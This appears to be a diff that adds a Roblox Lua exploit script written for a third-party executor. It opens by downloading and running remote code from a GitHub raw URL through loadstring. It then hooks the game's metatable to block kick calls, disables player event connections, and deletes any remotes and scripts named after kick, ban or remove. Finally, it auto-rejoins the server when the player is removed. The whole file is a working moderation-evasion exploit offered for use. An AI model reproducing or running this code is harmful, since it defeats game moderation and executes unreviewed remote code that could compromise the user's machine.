@@ -1,0 +1,150 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KaanFriztche/Open-source-/refs/heads/main/%C3%87%C3%B6lFarm"))()
+
+repeat task.wait() until game:IsLoaded()
+
+local _1 = game:GetService("Players")
+local _2 = game:GetService("ReplicatedStorage")
+local _3 = _1.LocalPlayer
+local _14 = getrawmetatable(game)
+setreadonly(_14, false)
+local _15 = _14.__namecall
+local _16 = _14.__index
+local _17 = _14.__newindex
+
+local _4 = {
+    ["Kick"] = true,
+    ["kick"] = true,
+    ["Destroy"] = true,
+    ["BreakJoints"] = true,
+    ["remove"] = true,
+    ["Remove"] = true,
+    ["Disconnect"] = true,
+}
+
+_14.__namecall = newcclosure(function(...)
+    local _5 = getnamecallmethod()
+    local _6 = {...}
+    if _4[_5] or tostring(_6[1]):lower():match("kick") then
+        return nil
+    end
+    return _15(...)
+end)
+
+_14.__index = newcclosure(function(_12, _13)
+    if tostring(_13):lower():match("kick") or tostring(_13):lower():match("remove") then
+        return function() return nil end
+    end
+    return _16(_12, _13)
+end)
+
+_14.__newindex = newcclosure(function(_12, _13, _11)
+    if tostring(_13):lower():match("kick") or tostring(_13):lower():match("remove") then
+        return
+    end
+    return _17(_12, _13, _11)
+end)
+
+_3.Kick = function() return nil end
+_3:Kick("")
+
+for _, _11 in ipairs(getconnections(_3.Kick)) do
+    pcall(function() _11:Disable() end)
+end
+
+for _, _11 in ipairs(getconnections(_3.AncestryChanged)) do
+    pcall(function() _11:Disable() end)
+end
+
+for _, _11 in ipairs(getconnections(_3.Changed)) do
+    pcall(function() _11:Disable() end)
+end
+
+for _, _11 in ipairs(getconnections(_3.ChildRemoved)) do
+    pcall(function() _11:Disable() end)
+end
+
+for _, _11 in ipairs(getconnections(_3.DescendantRemoving)) do
+    pcall(function() _11:Disable() end)
+end
+
+for _, _11 in ipairs(getconnections(_3.CharacterRemoving)) do
+    pcall(function() _11:Disable() end)
+end
+
+for _, _9 in ipairs(workspace:GetDescendants()) do
+    if _9:IsA("RemoteEvent") or _9:IsA("RemoteFunction") or _9:IsA("BindableEvent") or _9:IsA("BindableFunction") then
+        if _9.Name:lower():match("kick") or _9.Name:lower():match("ban") or _9.Name:lower():match("remove") then
+            pcall(function() _9:Destroy() end)
+        end
+    end
+end
+
+local function _10(_7)
+    for _, _9 in ipairs(_7:GetDescendants()) do
+        if _9:IsA("Script") or _9:IsA("LocalScript") then
+            if _9.Name:lower():match("kick") or _9.Name:lower():match("ban") or _9.Name:lower():match("remove") then
+                pcall(function() _9:Destroy() end)
+            end
+        end
+    end
+end
+
+_10(workspace)
+_10(_2)
+_10(_3)
+
+spawn(function()
+    while true do
+        pcall(function()
+            for _, _8 in ipairs(_1:GetPlayers()) do
+                if _8 ~= _3 then
+                    _10(_8)
+                end
+            end
+        end)
+        task.wait(1)
+    end
+end)
+
+spawn(function()
+    while true do
+        pcall(function()
+            for _, _11 in ipairs(workspace:GetDescendants()) do
+                if _11:IsA("RemoteEvent") or _11:IsA("RemoteFunction") then
+                    if _11.Name:lower():match("kick") then
+                        _11:Destroy()
+                    end
+                end
+            end
+        end)
+        task.wait(0.5)
+    end
+end)
+
+game.DescendantAdded:Connect(function(_9)
+    if _9:IsA("Script") or _9:IsA("LocalScript") then
+        if _9.Name:lower():match("kick") or _9.Name:lower():match("ban") or _9.Name:lower():match("remove") then
+            pcall(function() _9:Destroy() end)
+        end
+    end
+end)
+
+spawn(function()
+    while true do
+        pcall(function()
+            if not _3 or not _1:FindFirstChild(_3.Name) then
+                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, _3)
+            end
+        end)
+        task.wait(3)
+    end
+end)
+
+while true do
+    task.wait(1)
+    pcall(function()
+        if _3 == nil or _3.Parent == nil then
+            game:GetService("TeleportService"):Teleport(game.PlaceId, _3)
+        end
+    end)
+end
